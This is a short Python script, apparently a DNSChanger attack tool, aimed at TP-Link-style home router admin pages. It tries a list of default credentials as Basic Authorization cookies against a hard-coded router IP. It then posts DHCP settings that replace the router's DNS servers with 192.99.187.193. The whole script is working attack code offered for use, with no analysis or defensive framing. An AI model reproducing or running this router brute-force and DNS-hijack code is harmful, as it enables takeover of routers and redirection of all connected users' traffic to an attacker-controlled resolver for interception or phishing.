#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, md5, base64, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

def stringToBase64(s):
    return base64.b64encode(s.encode('utf-8'))

for x in password.Credentials:

    xx = stringToBase64(x)

    header = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control':'max-age=0',
        'Connection':'keep-alive',
        'Cookie':'Authorization=Basic '+xx,
        'Host':host,
        'Referer':'http://'+host,
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    }

    try:
        login = router.get("http://45.231.85.85/", headers=header)
        if "Status" in login.content:
            print("Login efetuado com sucesso")
            break
    except Exception as e:
        pass


data = {
    '[LAN_HOST_CFG#1,0,0,0,0,0#0,0,0,0,0,0]0,9':'',
    'DHCPServerEnable':'1',
    'minAddress':'192.168.0.100',
    'maxAddress':'192.168.0.199',
    'IPRouters':'192.168.0.1',
    'DHCPLeaseTime':'7200',
    'domainName':'',
    'DNSServers':''+dns1+","+dns2,
    'DHCPRelay':'0',
    'X_TP_DhcpRelayServer':'0.0.0.0'
}

header = {
    'Referer':'http://'+host+'/mainFrame.htm',
    'Cookie':'Authorization=Basic '+xx,
}

try:
    a = router.post("http://45.231.85.85/cgi?2", data=data, headers=header)

    print(a.content)

except Exception as e:
    pass